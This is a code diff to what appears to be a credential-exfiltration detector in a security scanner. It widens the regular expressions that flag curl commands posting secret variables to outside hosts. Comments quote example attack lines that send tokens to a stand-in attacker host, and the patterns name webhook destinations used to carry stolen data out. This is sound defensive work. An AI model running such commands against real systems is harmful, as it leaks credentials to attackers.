@@ -120,8 +120,13 @@ _SEND_SECRETS_PATTERNS: tuple[tuple[str, str], ...] = (
 
 _EXFIL_VIA_NETWORK_PATTERNS: tuple[tuple[str, str], ...] = (
     (
-        # curl -d "$SECRET" https://attacker.example/x — the -d / --data flag is the giveaway
-        rf"\bcurl\s+(?:-\w+\s+)*(?:-d|--data\b|--data-binary\b|--data-urlencode\b)\s+[\"']?\$?(?:{_SECRET_VAR_ALTERNATION})",
+        # curl -d "$SECRET" https://attacker.example/x — the -d / --data flag is the giveaway.
+        # v0.2.2 (Round 13 PR 13.1 — closes FN-019): widen to allow
+        # arbitrary chars between the opening quote and the secret
+        # reference. Real-world (Codecov-style) attackers form-field-
+        # prefix the secret: `-d "TOKEN=$GITHUB_TOKEN"`. The
+        # `[^"'\s]*` class absorbs the `TOKEN=` prefix before the `$`.
+        rf"\bcurl\s+(?:-\w+\s+)*(?:-d|--data\b|--data-binary\b|--data-urlencode\b)\s+[\"']?[^\"'\s]*\$?(?:{_SECRET_VAR_ALTERNATION})",
         "exfiltrate-via-network",
     ),
     (
@@ -132,6 +137,18 @@ _EXFIL_VIA_NETWORK_PATTERNS: tuple[tuple[str, str], ...] = (
         # Discord webhook / Slack webhook destinations are a strong T6 signal
         # paired with any secret-shaped data being POSTed.
         r"\b(?:curl|wget)\s+(?:-\w+\s+)*[^\s]*(?:discord\.com/api/webhooks|hooks\.slack\.com|webhook\.site)\b",
+        "exfiltrate-via-network",
+    ),
+    # v0.2.2 (Round 13 PR 13.1 — closes FN-019 part 2 on S-111
+    # Codecov-style multi-flag curl with form-prefixed secret).
+    # The carrier-aware pattern above expects (-flag\s+)* to absorb
+    # the flags between `curl` and `-d`; in real-world incidents the
+    # body lines are line-continued: `curl -X POST URL \\n  -d
+    # "TOKEN=$SECRET"`. Rather than widen the carrier discipline,
+    # match the `-d "<key>=$<SECRET>"` shape directly — it has no
+    # legitimate use independent of an exfil intent.
+    (
+        rf"(?:^|\s)(?:-d|--data\b|--data-binary\b|--data-urlencode\b)\s+[\"'][^\"'\s]*=\$(?:{_SECRET_VAR_ALTERNATION})",
         "exfiltrate-via-network",
     ),
     # v0.2.1 (Round 10 PR 10.3 — closes FN-010 on S-096 env-var → query-
@@ -226,7 +243,7 @@ class T6CredentialExfiltrationDetector:
     name = "t6.credential_exfiltration"
     threat_category = "T6"
     cci_id = "CCI-006"
-    detector_version = "0.2.1"
+    detector_version = "0.2.2"
 
     def run(self, ctx: DetectorContext) -> Verdict:
         hints: list[DiffHint] = []
